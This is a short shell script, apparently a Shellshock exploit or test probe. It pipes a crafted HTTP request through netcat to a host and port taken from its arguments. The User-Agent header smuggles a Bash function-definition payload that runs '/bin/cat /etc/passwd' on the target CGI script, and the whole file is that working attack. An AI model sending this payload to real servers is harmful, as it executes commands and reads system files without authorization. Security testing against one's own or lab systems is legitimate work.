#!/bin/sh
echo -en "GET /cgi-bin/vuln2-safe.cgi HTTP/1.1\r\nHost: localhost\r\nUser-Agent: () { :; }; echo;echo;/bin/cat /etc/passwd\r\n\r\n" | nc $1 $2
